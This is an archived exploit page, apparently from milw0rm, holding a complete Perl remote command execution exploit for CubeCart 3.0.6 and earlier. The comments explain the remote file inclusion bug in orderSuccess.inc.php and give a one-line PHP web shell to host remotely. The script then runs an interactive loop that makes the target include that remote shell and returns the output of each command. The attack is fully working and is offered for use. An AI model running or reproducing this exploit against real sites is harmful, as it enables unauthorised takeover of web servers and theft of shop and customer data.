<html><head><title>CubeCart <= 3.0.6 Remote Command Execution Exploit</title></head><pre>#!/usr/bin/perl
#
# cijfer-ccxpl - CubeCart &lt;=3.0.6 Remote Command Execution Exploit
#
# Copyright (c) 2005 cijfer &lt;cijfer@netti.fi&gt;
# All rights reserved.           
#
## 1. example
#
# [cijfer@kalma:/research]$ perl ./cijfer-ccxpl.pl -h www.xxx.com -d
# [cijfer@www.xxx.com /]$ id;uname -a
# uid=48(apache) gid=48(apache) groups=48(apache),2523(psaserv)
# Linux server.xxx.com 2.6.10-1.771_FC2 #1 Mon Mar 28 00:50:14 EST 2005 i686 i686 i386 GNU/Linux
#
# [cijfer@www.xxx.com /]$
#
## 2. explanation
#
# a serious bug was discovered by me in CubeCart 3.0.6 and below which an attacker
# can remotely execute arbitrary commands via 'includes/orderSuccess.inc.php' where  
# passing input to the 'glob' and 'cart_order_id' variable, we can attain access to
# passing input to the 'glob[rootDir]' variable, and include a remote execution script
# to execute arbitrary commands. as usual, this requires 'register_globals' to be
# enabled in order to successfully do this, otherwise a 403 error will show.
#
## 3. the bug
#
# this below allows us to bypass the 403 error...
#
#       &lt;?
#       ...
#       if(!isset($glob)){                                              [1]
#       ...
#
# pass more positive input to $cart_order_id and do you notice what is wrong here?
#       ...
#       if(isset($cart_order_id) &amp;&amp; !empty($cart_order_id)){            [2]
#               // build thank you and confirmation email
#               include($glob['rootDir'].&quot;/classes/htmlMimeMail.php&quot;);  [3] !dangerous!
#               $mail = new htmlMimeMail();
#       ...
#
## 4. the php shell
#
# this exploit grabs data via regular expression strings. foreign php shell
# scripts will not work with this exploit. use the following code along with
# this exploit and put it in 'cmd.txt' or whatever you please:
#
#       &lt;?passthru($_GET[cmd]);?&gt;
#
## 5. the greets
#
# kippis to Zodiac, felosi, and odz. also shouts to lethal &amp; hexy
#
##
#
# $Id: cijfer-ccxpl.pl,v 0.2 2005/12/30 06:02:00 cijfer Exp cijfer $

use Getopt::Std;
use IO::Socket;
use URI::Escape;

getopts(&quot;h:d:&quot;);

$host = $opt_h;
$dirs = $opt_d;
$shel = &quot;http://website.com/cmd.txt&quot;;    # cmd shell url
$cmdv = &quot;cmd&quot;;                           # cmd variable (ex. passthru($_GET[cmd]);)
$good = 0;

if(!$host||!$dirs)
{
        print &quot;cijfer-ccxpl.pl by cijfer\n&quot;;
        print &quot;usage: $0 -h cijfer.xxx -d /cubecart\r\n&quot;;
        print &quot;usage: $0 -h &lt;hostname&gt; -d &lt;directory&gt;\r\n&quot;;
        exit();
}

while()
{
        print &quot;[cijfer@&quot;.$host.&quot; /]\$ &quot;;
        while(&lt;STDIN&gt;)
        {
                $cmds=$_;
                chomp($cmds);
                last;
        }

        $string  = $dirs;
        $string .= &quot;/includes/orderSuccess.inc.php?&quot;;
        $string .= uri_escape($cmdv);
        $string .= &quot;=&quot;;
        $string .= &quot;%65%63%68%6F%20%5F%53%54%41%52%54%5F%3B&quot;;
        $string .= uri_escape($cmds).&quot;;echo&quot;;
        $string .= &quot;%3B%65%63%68%6F%20%5F%45%4E%44%5F;echo;&quot;;
        $string .= &quot;&amp;glob=1&amp;cart_order_id=1&amp;glob[rootDir]=&quot;;
        $string .= $shel;
        $string .= &quot;?&quot;;

        $sock = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $host, PeerPort =&gt; 80) || die &quot;error: connect()\n&quot;;

        print $sock &quot;GET $string HTTP/1.1\n&quot;;
        print $sock &quot;Host: $host\n&quot;;
        print $sock &quot;Accept: */*\n&quot;;
        print $sock &quot;Connection: close\n\n&quot;;

        while($result = &lt;$sock&gt;)
        {
                if($result =~ /^_END_/)
                {
                        $good=0;
                }

                if($good==1)
                {
                        print $result;
                }

                if($result =~ /^_START_/)
                {
                        $good=1;
                }
        }
}

# milw0rm.com [2005-12-30]</pre></html>